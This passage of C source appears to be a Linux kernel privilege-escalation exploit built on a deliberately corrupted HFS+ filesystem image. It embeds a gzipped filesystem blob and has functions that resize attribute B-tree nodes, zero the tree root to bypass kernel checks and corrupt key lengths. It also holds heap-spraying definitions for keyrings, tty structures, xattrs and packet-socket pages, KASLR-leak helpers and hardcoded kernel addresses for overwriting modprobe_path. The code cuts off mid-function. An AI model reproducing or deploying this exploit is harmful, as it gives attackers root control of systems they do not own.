&lt;sys/socket.h&gt;\n#include &lt;sys/xattr.h&gt;\n#include &lt;sys/syscall.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;sys/shm.h&gt;\n#include &lt;linux/keyctl.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;time.h&gt;\n#include &lt;zlib.h&gt;\n#include &lt;endian.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;linux/types.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;sys/mount.h&gt;\n#include &lt;pwd.h&gt;\n#include &lt;grp.h&gt;\n#include &lt;semaphore.h&gt;\n\n\n#define KEY_DESC_MAX_SIZE 900\n#define XATTR_NAME_MAX_SIZE 1024\n#define MODPROBE_PATH \"/proc/sys/kernel/modprobe\"\n#define BUFFER_SIZE 256\n\n/*\n#define DEBUG_CROSSCACHE 1\n*/\n\n/* see security/keys/key.c */\n#define SPRAY_KEY_SIZE 13\n#define SPRAY_KEY_SIZE_INIT 6\n#define SPRAY_TTY_INITIAL 6\n#define SPRAY_TTY_SIZE 9\n#define SPRAY_XATTR_SIZE_MODPROBE 15\n\n#define do_error_exit(msg) do {perror(\"[-] \" msg); exit(EXIT_FAILURE); } while (0)\n\n#define KERNEL_BASE_LOWER 0xffffffff80000000\n#define KERNEL_BASE_UPPER 0xffffffffc0000000\n\n#define OFFSET_2ND_PTR 0x230\n#define OFFSET_3RD_PTR (OFFSET_2ND_PTR + (0x60))\n\n#define BASE_ADDR_FIRST  0xffffffff82284be0\n#define BASE_ADDR_SECOND 0xffffffff81631bc0\n#define BASE_ADDR_THIRD  0xffffffff81633e30\n\n#define MODPROBE_ADDR_ONE 0xffffffff82b3f638\n#define MODPROBE_ADDR_TWO 0xffffffff82b3f63c\n\n#define KERNEL_BASE 0xffffffff81000000\n\n#define PIPE_SPRAY_NUM 20\n\n#define PGV_1PAGE_SPRAY_NUM 0x100\n\n#define PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM\n#define PGV_4PAGES_SPRAY_NUM 0x100\n\n#define PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)\n#define PGV_8PAGES_SPRAY_NUM 0x100\n\nint pgv_1page_start_idx;\nint pgv_4pages_start_idx = PGV_4PAGES_START_IDX;\nint pgv_8pages_start_idx = PGV_8PAGES_START_IDX;\n\nuint64_t kaslr_base_recovered;\n\n#define PGV_PAGE_NUM 1000\n#define PACKET_VERSION 10\n#define PACKET_TX_RING 13\n\nstruct tpacket_req {\n    unsigned int tp_block_size;\n    unsigned int tp_block_nr;\n    unsigned int tp_frame_size;\n    unsigned int tp_frame_nr;\n};\n\n/* Each allocation is (size * nr) bytes, aligned to PAGE_SIZE */\nstruct pgv_page_request {\n    int idx;\n    int cmd;\n    unsigned int size;\n    unsigned int nr;\n};\n\n/* Operations type */\nenum {\n    CMD_ALLOC_PAGE,\n    CMD_FREE_PAGE,\n    CMD_EXIT,\n};\n\n/* Tpacket version for setsockopt */\nenum tpacket_versions {\n    TPACKET_V1,\n    TPACKET_V2,\n    TPACKET_V3,\n};\n\ntypedef int32_t key_serial_t;\n\n#define CHUNK 16384\n\n#define __packed __attribute__((packed))\n\n#define HFSPLUS_ATTR_MAX_STRLEN 127\n\ntypedef __be32 hfsplus_cnid;\ntypedef __be16 hfsplus_unichr;\ntypedef __u32 u32;\ntypedef __u16 u16;\ntypedef __u8 u8;\ntypedef __s8 s8;\n\nstruct write4_payload {\n    void *next;\n    void *prev;\n    uint8_t name_offset;\n} __attribute__((packed));\n\nuint64_t get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size);\n\nvoid release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size);\n\nstatic inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)\n{\n    return syscall(__NR_add_key, type, description, payload, plen, ringid);\n}\n\nstatic inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)\n{\n    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);\n}\n\nvoid set_cpu_affinity(int cpu_n, pid_t pid);\n\nvoid spray_tty_struct(int num);\n\nkey_serial_t *spray_keyring(uint32_t spray_size, uint32_t offset);\n\n\nstruct hfsplus_attr_unistr {\n    __be16 length;\n    hfsplus_unichr unicode[HFSPLUS_ATTR_MAX_STRLEN];\n} __packed;\n\n/* HFS+ attributes tree key */\nstruct hfsplus_attr_key {\n    __be16 key_len;\n    __be16 pad;\n    hfsplus_cnid cnid;\n    __be32 start_block;\n    struct hfsplus_attr_unistr key_name;\n} __packed;\n\n#define HFSPLUS_ATTR_KEYLEN    sizeof(struct hfsplus_attr_key)\n\n/* A single contiguous area of a file */\nstruct hfsplus_extent {\n    __be32 start_block;\n    __be32 block_count;\n} __packed;\ntypedef struct hfsplus_extent hfsplus_extent_rec[8];\n\n/* Information for a \"Fork\" in a file */\nstruct hfsplus_fork_raw {\n    __be64 total_size;\n    __be32 clump_size;\n    __be32 total_blocks;\n    hfsplus_extent_rec extents;\n} __packed;\n\n/* HFS+ Volume Header */\nstruct hfsplus_vh {\n    __be16 signature;\n    __be16 version;\n    __be32 attributes;\n    __be32 last_mount_vers;\n    u32 reserved;\n\n    __be32 create_date;\n    __be32 modify_date;\n    __be32 backup_date;\n    __be32 checked_date;\n\n    __be32 file_count;\n    __be32 folder_count;\n\n    __be32 blocksize;\n    __be32 total_blocks;\n    __be32 free_blocks;\n\n    __be32 next_alloc;\n    __be32 rsrc_clump_sz;\n    __be32 data_clump_sz;\n    hfsplus_cnid next_cnid;\n\n    __be32 write_count;\n    __be64 encodings_bmp;\n\n    u32 finder_info[8];\n\n    struct hfsplus_fork_raw alloc_file;\n    struct hfsplus_fork_raw ext_file;\n    struct hfsplus_fork_raw cat_file;\n    struct hfsplus_fork_raw attr_file;\n    struct hfsplus_fork_raw start_file;\n} __packed;\n\n\n/* HFS+ BTree node descriptor */\nstruct hfs_bnode_desc {\n    __be32 next;\n    __be32 prev;\n    s8 type;\n    u8 height;\n    __be16 num_recs;\n    u16 reserved;\n} __packed;\n\n/* HFS+ BTree node types */\n#define HFS_NODE_INDEX    0x00    /* An internal (index) node */\n#define HFS_NODE_HEADER    0x01    /* The tree header node (node 0) */\n#define HFS_NODE_MAP    0x02    /* Holds part of the bitmap of used nodes */\n#define HFS_NODE_LEAF    0xFF    /* A leaf (ndNHeight==1) node */\n\n/* HFS+ BTree header */\nstruct hfs_btree_header_rec {\n    __be16 depth;\n    __be32 root;\n    __be32 leaf_count;\n    __be32 leaf_head;\n    __be32 leaf_tail;\n    __be16 node_size;\n    __be16 max_key_len;\n    __be32 node_count;\n    __be32 free_nodes;\n    u16 reserved1;\n    __be32 clump_size;\n    u8 btree_type;\n    u8 key_type;\n    __be32 attributes;\n    u32 reserved3[16];\n} __packed;\n\n#define HFS_TREE_BIGKEYS    2\n#define HFS_TREE_VARIDXKEYS    4\n\n\n/* Gzipped vanilla HFS+ that we are going to corrupt */\nunsigned char vanilla_hfs_bin[] = {\n  0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x5d, 0x90,\n  0x79, 0x54, 0x12, 0x06, 0x00, 0xc6, 0xc1, 0xca, 0xb9, 0xe9, 0x6c, 0x79,\n  0x65, 0xb4, 0xe4, 0xe5, 0xc9, 0x4c, 0xd3, 0xcc, 0x7c, 0x6a, 0xa5, 0x5b,\n  0x4c, 0x4b, 0x9c, 0x4f, 0x53, 0xf7, 0x3c, 0x40, 0xb7, 0x28, 0x73, 0xa4,\n  0x50, 0x1e, 0x80, 0x07, 0x1e, 0xaf, 0x56, 0x21, 0x4d, 0xe9, 0x52, 0xd3,\n  0x54, 0x40, 0x43, 0x49, 0xc4, 0x32, 0x52, 0x1a, 0x82, 0x69, 0x86, 0x28,\n  0x1e, 0x25, 0x79, 0x2b, 0xa0, 0x79, 0xe0, 0x81, 0x52, 0x98, 0x47, 0x5e,\n  0xec, 0xad, 0xf7, 0xb6, 0xb4, 0xef, 0xdf, 0xdf, 0x1f, 0xdf, 0xef, 0xfb,\n  0xc0, 0x37, 0xb4, 0x00, 0x9f, 0xb2, 0x6d, 0x76, 0x08, 0xee, 0x17, 0x88,\n  0x05, 0x08, 0xdf, 0x67, 0x3e, 0x95, 0x18, 0xdb, 0xfd, 0x40, 0x32, 0x22,\n  0xfe, 0x05, 0x31, 0xb8, 0x36, 0x40, 0xb5, 0x1f, 0x8e, 0xa0, 0x82, 0x74,\n  0xaa, 0xf3, 0x03, 0xdf, 0x35, 0x69, 0xdd, 0x45, 0x12, 0x21, 0xa6, 0x15,\n  0x1a, 0x97, 0xd3, 0xf5, 0xa4, 0xb8, 0x67, 0xf7, 0x46, 0xfe, 0xdc, 0x4e,\n  0x32, 0xa5, 0x69, 0x19, 0x13, 0x2b, 0x5f, 0x58, 0xfb, 0x73, 0x4d, 0x8d,\n  0xf5, 0x68, 0x5a, 0x2f, 0xc6, 0x40, 0xa0, 0xa5, 0xc1, 0x58, 0xa6, 0xe4,\n  0x9c, 0x90, 0x53, 0x74, 0xa1, 0xcc, 0xe5, 0xcd, 0x87, 0xf5, 0x63, 0x85,\n  0x79, 0x71, 0x13, 0x6d, 0x4b, 0x05, 0x72, 0xd9, 0x5a, 0x99, 0xc9, 0xed,\n  0x53, 0xe2, 0xcb, 0x4d, 0xd1, 0x7a, 0x7c, 0x85, 0x92, 0x2f, 0x88, 0x84,\n  0x53, 0xd5, 0x4d, 0xdf, 0x16, 0xb9, 0xd5, 0xd5, 0x6a, 0x68, 0xa4, 0xd0,\n  0xd9, 0x1a, 0x7c, 0x3c, 0x29, 0xf4, 0x82, 0x12, 0x13, 0x3e, 0x72, 0xec,\n  0xa7, 0xa1, 0xbe, 0x61, 0x4a, 0xb6, 0x92, 0xe7, 0x42, 0x85, 0xe1, 0xd2,\n  0x72, 0x86, 0x18, 0x8e, 0x96, 0x6d, 0xa9, 0x39, 0x27, 0x5f, 0x1d, 0x95,\n  0x5b, 0x16, 0xd8, 0x9b, 0x18, 0xc0, 0x15, 0x41, 0x16, 0x0a, 0x29, 0x07,\n  0x62, 0xd9, 0x1c, 0x37, 0xed, 0xd8, 0x92, 0x70, 0x80, 0xae, 0x88, 0x6d,\n  0x23, 0x8a, 0xc5, 0x76, 0x07, 0x9d, 0x88, 0x67, 0xd1, 0xac, 0x39, 0xe7,\n  0x3e, 0x6b, 0x7a, 0x46, 0x71, 0xdd, 0xf4, 0x75, 0x9f, 0xa8, 0x01, 0x5f,\n  0xf8, 0x75, 0xc8, 0x04, 0xa5, 0x35, 0x24, 0xad, 0xaa, 0x8f, 0xcd, 0xc0,\n  0x35, 0x9f, 0xf1, 0x11, 0xc3, 0x42, 0x56, 0x48, 0xe3, 0x2e, 0x74, 0xaf,\n  0x22, 0x18, 0x96, 0x55, 0x3e, 0xbd, 0xbb, 0x77, 0xdb, 0x0e, 0x9a, 0xc9,\n  0xfc, 0x00, 0x39, 0x37, 0x9b, 0xbc, 0xef, 0x9b, 0xc3, 0x5e, 0xf9, 0x6a,\n  0xe7, 0x28, 0x41, 0x7b, 0x17, 0x07, 0xa7, 0x83, 0xc2, 0xec, 0x8e, 0x7e,\n  0x1e, 0x33, 0x8e, 0xae, 0xad, 0x69, 0x60, 0xde, 0xc8, 0x4d, 0x65, 0x8b,\n  0xce, 0x77, 0x06, 0xdf, 0x3a, 0x15, 0x30, 0x35, 0x7e, 0x6c, 0xaa, 0xa2,\n  0x89, 0xfa, 0xb8, 0xc3, 0xf7, 0x10, 0xdc, 0x5c, 0x0f, 0x75, 0x9c, 0x19,\n  0x24, 0x5f, 0x5d, 0x76, 0x2f, 0x94, 0x82, 0x56, 0x5e, 0xf3, 0xf0, 0xa5,\n  0xc9, 0x9e, 0xc9, 0x09, 0xb4, 0xd5, 0x9a, 0x69, 0xaf, 0x57, 0x17, 0x3d,\n  0xf2, 0xe3, 0x11, 0xb0, 0xcc, 0x9b, 0xee, 0xc1, 0x83, 0xb5, 0x7e, 0xdb,\n  0x87, 0xd5, 0xe6, 0xb1, 0x90, 0x94, 0x96, 0x01, 0x61, 0xdc, 0xce, 0x45,\n  0x6b, 0xe8, 0xac, 0xa4, 0x92, 0xd1, 0x03, 0x6e, 0xce, 0x1b, 0xe9, 0x63,\n  0x66, 0x55, 0xcb, 0xe2, 0x46, 0x33, 0x08, 0x58, 0x65, 0xf3, 0x6e, 0xdf,\n  0x44, 0xbe, 0xf5, 0x3e, 0x02, 0xce, 0xd2, 0x65, 0x10, 0x7b, 0xa6, 0xb4,\n  0xd5, 0xa9, 0x3d, 0x2c, 0x57, 0xb9, 0x4a, 0x9e, 0xab, 0x42, 0xc7, 0x42,\n  0xf0, 0x1b, 0x8c, 0xa8, 0xd0, 0x55, 0x5d, 0x72, 0x85, 0x59, 0xeb, 0x53,\n  0xbb, 0xf6, 0x29, 0x54, 0x05, 0x98, 0x51, 0x11, 0xed, 0xff, 0xb1, 0x74,\n  0x95, 0x1e, 0xa4, 0x09, 0x26, 0x0f, 0x3a, 0x2b, 0x45, 0xa5, 0x2f, 0x44,\n  0xe5, 0xac, 0xe3, 0x42, 0xca, 0x58, 0xf9, 0x62, 0xb8, 0xae, 0xb2, 0xf2,\n  0x92, 0xcd, 0x51, 0xfd, 0x65, 0x86, 0x40, 0x21, 0xf0, 0xb6, 0xb3, 0x38,\n  0xc9, 0xe8, 0x69, 0x81, 0x46, 0x37, 0x56, 0x23, 0x69, 0x75, 0x26, 0x80,\n  0xff, 0x52, 0xff, 0xdb, 0xcf, 0x84, 0xa5, 0x7e, 0x9f, 0x99, 0x59, 0x65,\n  0x9a, 0x83, 0x8b, 0xff, 0x7d, 0x87, 0xce, 0x97, 0xdd, 0xa3, 0x7e, 0x37,\n  0xab, 0xaa, 0xba, 0x96, 0x2e, 0x3d, 0x9f, 0xcc, 0x9e, 0x62, 0xfa, 0xf2,\n  0x6b, 0xe0, 0x8e, 0x98, 0xb7, 0x0c, 0x0b, 0x4d, 0xd1, 0x7b, 0xa5, 0xa8,\n  0xb0, 0x92, 0x05, 0x92, 0xe7, 0x5f, 0x4a, 0x46, 0xe7, 0x36, 0xb0, 0x25,\n  0xa7, 0xfb, 0xcd, 0x42, 0xd9, 0xf2, 0xb9, 0x0f, 0xfd, 0x79, 0xcf, 0xdc,\n  0x47, 0xe6, 0xaf, 0xac, 0x62, 0x16, 0x32, 0xb3, 0xb0, 0xc4, 0x14, 0x3e,\n  0xab, 0x83, 0xe6, 0xe7, 0xe6, 0x35, 0xb9, 0x53, 0xe3, 0x53, 0x81, 0x1a,\n  0x31, 0x2a, 0x19, 0x7e, 0x59, 0x93, 0x45, 0xf1, 0xc6, 0x5b, 0x2c, 0xd9,\n  0xe6, 0x66, 0x56, 0xaa, 0x96, 0x55, 0x53, 0x9d, 0xa9, 0x42, 0xbf, 0x4c,\n  0xf9, 0x5a, 0x03, 0xa8, 0x44, 0xce, 0x31, 0x33, 0x0c, 0x0f, 0xd3, 0xce,\n  0x3f, 0x71, 0x1b, 0xb9, 0xde, 0x08, 0x5e, 0x2e, 0x4f, 0x2e, 0xaf, 0xab,\n  0x06, 0x3b, 0x84, 0xc6, 0xc9, 0x25, 0x0d, 0x56, 0xb4, 0xaf, 0x17, 0x32,\n  0x3c, 0x44, 0xb4, 0x1d, 0xa2, 0x86, 0xac, 0x96, 0x09, 0x4c, 0xc0, 0x62,\n  0x38, 0x66, 0xe6, 0x83, 0xd8, 0xd1, 0xd5, 0xf7, 0x61, 0x08, 0xcf, 0x2a,\n  0x30, 0xc9, 0x33, 0xd1, 0xb9, 0x83, 0xde, 0x5d, 0xc9, 0xe5, 0xed, 0xc7,\n  0xce, 0x94, 0x8c, 0xc1, 0xfd, 0xe9, 0xeb, 0x57, 0xcd, 0xfa, 0xe1, 0x84,\n  0xe8, 0xf3, 0xf8, 0xc8, 0x6e, 0x43, 0xa9, 0x5b, 0x71, 0x78, 0xa2, 0x78,\n  0x23, 0x18, 0x7a, 0x45, 0x56, 0x26, 0x9d, 0x5e, 0x53, 0x3d, 0xd1, 0x65,\n  0xee, 0x5d, 0x07, 0x0a, 0xad, 0xf5, 0x53, 0x21, 0xf9, 0x77, 0xcc, 0x29,\n  0x7b, 0x82, 0x10, 0x01, 0x46, 0xaa, 0x5f, 0x17, 0x2e, 0x93, 0x22, 0xe6,\n  0xc2, 0x54, 0x54, 0x5d, 0x75, 0xe4, 0x1c, 0xa9, 0xc8, 0x27, 0xc7, 0xdb,\n  0x9d, 0xc7, 0x78, 0xe8, 0x4f, 0x40, 0x0c, 0xf7, 0xca, 0x10, 0xc3, 0x31,\n  0xd8, 0xc4, 0x45, 0x25, 0xdc, 0xf6, 0x4a, 0x75, 0xbb, 0xa7, 0xd5, 0xbc,\n  0xc3, 0xd8, 0xfe, 0xb2, 0xb4, 0x99, 0xd6, 0x67, 0xf8, 0xba, 0x47, 0x1b,\n  0xbd, 0x87, 0x4c, 0x3b, 0x8f, 0xec, 0xe5, 0x74, 0xb1, 0x77, 0xf1, 0x83,\n  0x6a, 0x23, 0x1f, 0xe0, 0xb0, 0xd2, 0xae, 0x5f, 0x0c, 0x57, 0x94, 0x9f,\n  0xe6, 0xa6, 0xa7, 0x41, 0x63, 0x8a, 0x82, 0xa3, 0xed, 0x09, 0x23, 0x0f,\n  0x5a, 0x6e, 0xd1, 0x23, 0x80, 0xff, 0xff, 0x0c, 0x48, 0x57, 0x73, 0xf5,\n  0x0e, 0x07, 0x64, 0x60, 0x0c, 0xed, 0xa9, 0x8f, 0x6f, 0x18, 0xb9, 0x6a,\n  0x7e, 0x26, 0x80, 0xc9, 0x76, 0x7b, 0x9b, 0x7a, 0x04, 0x67, 0x87, 0x1f,\n  0x2a, 0xca, 0xe2, 0x84, 0x70, 0x13, 0x00, 0xf0, 0x43, 0x38, 0x08, 0xb2,\n  0x18, 0x0d, 0x7c, 0x5b, 0x9d, 0x6a, 0x94, 0x77, 0xa2, 0x77, 0x0b, 0x1a,\n  0x27, 0x09, 0x34, 0x1b, 0xe1, 0x00, 0x2b, 0x9f, 0x2c, 0x1b, 0x9f, 0x49,\n  0xe3, 0x4d, 0x84, 0xca, 0xf9, 0xb7, 0x68, 0xee, 0xf7, 0x74, 0xe0, 0xd5,\n  0xb0, 0xa7, 0xaf, 0x0f, 0x6d, 0x22, 0x3f, 0x5e, 0xbc, 0x76, 0x06, 0x38,\n  0xc1, 0xb5, 0x4d, 0x87, 0xc1, 0x0f, 0xec, 0xfa, 0x42, 0x81, 0x3b, 0x9e,\n  0x74, 0x17, 0xa3, 0xfd, 0xdd, 0xa3, 0x05, 0x76, 0xb3, 0x01, 0x77, 0x0b,\n  0xb2, 0x0d, 0xb2, 0x71, 0x32, 0x96, 0x6a, 0x38, 0xa3, 0x62, 0xcf, 0xa1,\n  0xbe, 0xd0, 0xcb, 0xbe, 0x97, 0x07, 0x8b, 0xff, 0x6a, 0x9b, 0x0e, 0x44,\n  0x51, 0x7c, 0x35, 0x6b, 0xd3, 0x58, 0x40, 0xd2, 0x61, 0x1d, 0x6d, 0xfb,\n  0x5e, 0x34, 0x30, 0x70, 0x20, 0x34, 0xe3, 0x0b, 0x85, 0x1e, 0xdb, 0xde,\n  0x92, 0x78, 0x78, 0x7a, 0x02, 0x8b, 0xe2, 0x51, 0xfa, 0xfa, 0xc8, 0x16,\n  0xf4, 0x37, 0xb2, 0xaa, 0xe1, 0x9d, 0x51, 0xbd, 0xd7, 0x1d, 0x33, 0x6f,\n  0xfd, 0xad, 0x7a, 0xb3, 0xd2, 0x12, 0x6e, 0xfc, 0xfc, 0x69, 0x33, 0x9e,\n  0xc7, 0x82, 0xc3, 0x59, 0xe8, 0x28, 0x4f, 0xfb, 0x63, 0xa2, 0xe7, 0x5e,\n  0x12, 0x12, 0x59, 0xe1, 0x7a, 0x72, 0xcf, 0xd1, 0x02, 0xb7, 0xee, 0x48,\n  0x10, 0x5a, 0x25, 0x25, 0xeb, 0xeb, 0x36, 0x0d, 0x3a, 0x2a, 0x16, 0x7a,\n  0x56, 0x0c, 0xc8, 0x06, 0x9f, 0x6d, 0xea, 0x65, 0xaa, 0x89, 0xd1, 0xb5,\n  0x2a, 0x49, 0x0e, 0x1d, 0xd8, 0x8a, 0x4c, 0x83, 0xa1, 0x96, 0xb2, 0x9d,\n  0x2e, 0xd6, 0xc9, 0x1c, 0xa1, 0x85, 0x7a, 0x04, 0xe9, 0x93, 0x52, 0x3c,\n  0xc2, 0xcb, 0xf3, 0x0f, 0x7e, 0x12, 0x2e, 0x6e, 0x88, 0xbe, 0xd1, 0x13,\n  0x88, 0x22, 0x42, 0x6b, 0x63, 0x98, 0xae, 0x02, 0xb4, 0x02, 0x5c, 0x78,\n  0x04, 0x5b, 0x74, 0x70, 0xd0, 0x97, 0xb0, 0x7e, 0x2d, 0x45, 0xc0, 0xcd,\n  0x30, 0xbc, 0x5e, 0xce, 0x7d, 0xf3, 0x96, 0x45, 0xf8, 0xfe, 0xbe, 0x5b,\n  0xc2, 0x86, 0x53, 0x0b, 0xe5, 0x61, 0x41, 0xa2, 0x8c, 0xae, 0x06, 0x02,\n  0xfe, 0x01, 0x5a, 0x8c, 0xfd, 0x33, 0x35, 0x05, 0x00, 0x00\n};\nunsigned int vanilla_hfs_bin_len = 1258;\n\n\n/* HFS+ epoch starts on January 1, 1904 */\n#define HFSPLUS_EPOCH_DIFF 2082844800 /* Difference between HFS+ and Unix epoch in seconds (1904-1970) */\n\n/* Function to convert HFS+ timestamp to Unix timestamp and then to a human-readable date */\nvoid hfsplus_to_date(unsigned int hfsplus_timestamp)\n{\n    /* Convert HFS+ timestamp to Unix timestamp */\n    time_t unix_timestamp = hfsplus_timestamp - HFSPLUS_EPOCH_DIFF;\n\n    /* Convert the Unix timestamp to local time */\n    struct tm *tm_info = localtime(&amp;unix_timestamp);\n\n    if (tm_info == NULL) {\n        printf(\"Failed to convert timestamp\\n\");\n        return;\n    }\n\n    /* Output the formatted date */\n    char buffer[80];\n\n    strftime(buffer, sizeof(buffer), \"%Y-%m-%d %H:%M:%S\", tm_info);\n    printf(\"%s\\n\", buffer);\n}\n\nvoid parse_tree(struct hfs_btree_header_rec *tree)\n{\n    struct hfs_bnode_desc *header_node = (struct hfs_bnode_desc *)((void *)tree - sizeof(struct hfs_bnode_desc));\n\n    printf(\"\\tHeader node next: 0x%x\\n\", be32toh(header_node-&gt;next));\n    printf(\"\\tHeader node prev: 0x%x\\n\", be32toh(header_node-&gt;prev));\n    printf(\"\\tHeader node type: \");\n    if (header_node-&gt;type == HFS_NODE_HEADER)\n        printf(\"HFS_NODE_HEADER\\n\");\n    else\n        printf(\"0x%x\\n\", header_node-&gt;type);\n\n    printf(\"\\tHeader node number of records: 0x%x\\n\", be16toh(header_node-&gt;num_recs));\n\n    printf(\"\\tDepth: 0x%x\\n\", be16toh(tree-&gt;depth));\n    printf(\"\\tRoot: 0x%x\\n\", be32toh(tree-&gt;root));\n    printf(\"\\tNode size: 0x%x\\n\", be16toh(tree-&gt;node_size));\n    printf(\"\\tMax key length: 0x%x\\n\", be16toh(tree-&gt;max_key_len));\n    printf(\"\\tNode count: 0x%x\\n\", be32toh(tree-&gt;node_count));\n    printf(\"\\tAttributes:\\n\");\n    if (be32toh(tree-&gt;attributes) &amp; HFS_TREE_BIGKEYS)\n        printf(\"\\t\\tHFS_TREE_BIGKEYS\\n\");\n    if (be32toh(tree-&gt;attributes) &amp; HFS_TREE_VARIDXKEYS)\n        printf(\"\\t\\tHFS_TREE_VARIDXKEYS\\n\");\n}\n\n\nvoid parse_volume(const unsigned char *hfs_buffer, size_t len)\n{\n    struct hfsplus_vh *hfs_vh = (struct hfsplus_vh *)(hfs_buffer+0x400);\n\n    printf(\"[+] Basic information about hfs+ volume\\n\");\n    printf(\"\\tSignature: 0x%x\\n\", be16toh(hfs_vh-&gt;signature));\n    printf(\"\\tVersion: 0x%x\\n\", be16toh(hfs_vh-&gt;version));\n    printf(\"\\tCreation date: \");\n    hfsplus_to_date(be32toh(hfs_vh-&gt;create_date));\n    printf(\"\\tBlock size: 0x%x\\n\", be32toh(hfs_vh-&gt;blocksize));\n    printf(\"\\tTotal blocks: 0x%x\\n\", be32toh(hfs_vh-&gt;total_blocks));\n    printf(\"\\tNext cnid: 0x%x\\n\", be32toh(hfs_vh-&gt;next_cnid));\n\n\n    printf(\"[+] Checking catalog and attribute btrees\\n\");\n    printf(\"\\tCatalog start block: 0x%x\\n\", be32toh(hfs_vh-&gt;cat_file.extents-&gt;start_block));\n    printf(\"\\tCatalog block count: 0x%x\\n\", be32toh(hfs_vh-&gt;cat_file.extents-&gt;block_count));\n\n    printf(\"\\tAttribute start block: 0x%x\\n\", be32toh(hfs_vh-&gt;attr_file.extents-&gt;start_block));\n    printf(\"\\tAttrbiute block count: 0x%x\\n\", be32toh(hfs_vh-&gt;attr_file.extents-&gt;block_count));\n\n    size_t blocksize = be32toh(hfs_vh-&gt;blocksize);\n\n    size_t cat_tree_start_address = be32toh(hfs_vh-&gt;attr_file.extents-&gt;start_block) * blocksize;\n\n    cat_tree_start_address += sizeof(struct hfs_bnode_desc);\n    struct hfs_btree_header_rec *cat_tree = (struct hfs_btree_header_rec *)(hfs_buffer+cat_tree_start_address);\n\n\n    size_t attr_tree_start_address = be32toh(hfs_vh-&gt;attr_file.extents-&gt;start_block) * blocksize;\n\n    attr_tree_start_address += sizeof(struct hfs_bnode_desc);\n    struct hfs_btree_header_rec *attr_tree = (struct hfs_btree_header_rec *)(hfs_buffer+attr_tree_start_address);\n\n\n    printf(\"[+] Parsing basic stuff about catalog file\\n\");\n    parse_tree(cat_tree);\n\n    printf(\"[+] Parsing basic stuff about attribute file\\n\");\n    parse_tree(attr_tree);\n\n}\n\n\nvoid resize_nodes(unsigned char *hfs_buffer, size_t len)\n{\n    uint8_t footer_node[] = {\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x77, 0x00,\n    0x76, 0x00, 0x75, 0x00, 0x74, 0x42, 0x00, 0x0e\n    };\n\n    struct hfsplus_vh *hfs_vh = (struct hfsplus_vh *)(hfs_buffer+0x400);\n    size_t blocksize = be32toh(hfs_vh-&gt;blocksize);\n    size_t attr_tree_start_address_base = be32toh(hfs_vh-&gt;attr_file.extents-&gt;start_block) * blocksize;\n    size_t attr_tree_start_address = attr_tree_start_address_base + sizeof(struct hfs_bnode_desc);\n    struct hfs_btree_header_rec *attr_tree = (struct hfs_btree_header_rec *)(hfs_buffer+attr_tree_start_address);\n\n    printf(\"[+] Resizing attribute tree nodes to make same space for machinery\\n\");\n    printf(\"\\tNode size: 0x%x\\n\", be16toh(attr_tree-&gt;node_size));\n\n    /* Let's have a bigger node size so we can fit our payloads nicely */\n    attr_tree-&gt;node_size = htobe16(0x8000);\n\n    printf(\"\\tNode size (corrupted): 0x%x\\n\", be16toh(attr_tree-&gt;node_size));\n\n    /* The node footer has to go to the new place */\n    unsigned char *dest_address = hfs_buffer + attr_tree_start_address_base + (0x8000-0x10);\n    unsigned char *src_address = hfs_buffer + attr_tree_start_address_base + (0x2000-0x10);\n\n    printf(\"\\tOriginal footer at: 0x%lx\\n\", (unsigned long)src_address);\n    printf(\"\\tNew footer at: 0x%lx\\n\", (unsigned long)dest_address);\n\n    printf(\"\\tOriginal footer at (relative): 0x%lx\\n\", (unsigned long)src_address - (unsigned long)hfs_buffer);\n    printf(\"\\tNew footer at (relative): 0x%lx\\n\", (unsigned long)dest_address - (unsigned long)hfs_buffer);\n\n    memcpy(dest_address, src_address, 0x10);\n\n    /* The target node footer is given by us */\n    unsigned char *dest_address_node = hfs_buffer + attr_tree_start_address_base + (2 * 0x8000 - 0x10);\n\n    memcpy(dest_address_node, &amp;footer_node, 0x10);\n\n\n    /* The node footer has to go to the new place */\n    unsigned char *src_address_data = hfs_buffer + attr_tree_start_address_base + 0x2000;\n    unsigned char *dest_address_data = hfs_buffer + attr_tree_start_address_base + 0x8000;\n\n    printf(\"\\tOriginal attribute records at: 0x%lx\\n\", (unsigned long)src_address_data);\n    printf(\"\\tNew attribute records at: 0x%lx\\n\", (unsigned long)dest_address_data);\n\n    memcpy(dest_address_data, src_address_data, 0x200);\n}\n\nvoid remove_root(unsigned char *hfs_buffer, size_t len)\n{\n    struct hfsplus_vh *hfs_vh = (struct hfsplus_vh *)(hfs_buffer+0x400);\n    size_t blocksize = be32toh(hfs_vh-&gt;blocksize);\n    size_t attr_tree_start_address_base = be32toh(hfs_vh-&gt;attr_file.extents-&gt;start_block) * blocksize;\n    size_t attr_tree_start_address = attr_tree_start_address_base + sizeof(struct hfs_bnode_desc);\n    struct hfs_btree_header_rec *attr_tree = (struct hfs_btree_header_rec *)(hfs_buffer+attr_tree_start_address);\n\n    printf(\"[+] Removing root to bypass hfs_brec_find checks\\n\");\n\n    printf(\"\\tRoot: 0x%x\\n\", be32toh(attr_tree-&gt;root));\n\n    /* Let's zero out the root to bypass checks */\n    attr_tree-&gt;root = htobe32(0x0);\n\n    printf(\"\\tRoot (corrupted): 0x%x\\n\", be16toh(attr_tree-&gt;root));\n}\n\n\nvoid corrupt_key_len(unsigned char *hfs_buffer, size_t len, uint16_t new_length)\n{\n    struct hfsplus_vh *hfs_vh = (struct hfsplus_vh *)(hfs_buffer+0x400);\n    size_t blocksize = be32toh(hfs_vh-&gt;blocksize);\n    size_t attr_tree_start_address_base = be32toh(hfs_vh-&gt;attr_file.extents-&gt;start_block) * blocksize;\n    size_t attr_tree_start_address = attr_tree_start_address_base + sizeof(struct hfs_bnode_desc);\n    struct hfs_btree_header_rec *attr_tree = (struct hfs_btree_header_rec 